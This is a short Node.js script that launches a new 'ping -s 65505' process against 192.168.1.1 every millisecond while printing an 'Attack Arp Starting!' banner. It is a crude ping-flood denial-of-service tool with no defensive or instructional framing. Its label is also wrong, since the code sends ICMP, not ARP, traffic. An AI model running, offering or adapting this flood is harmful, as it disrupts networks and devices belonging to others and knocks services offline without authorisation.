import { exec }from 'child_process'
import gradient from 'gradient-string'
setInterval(()=>{
	exec('ping -s 65505 192.168.1.1');
},1);

console.log(gradient(['blue','red'])('     Attack Arp Starting!'))
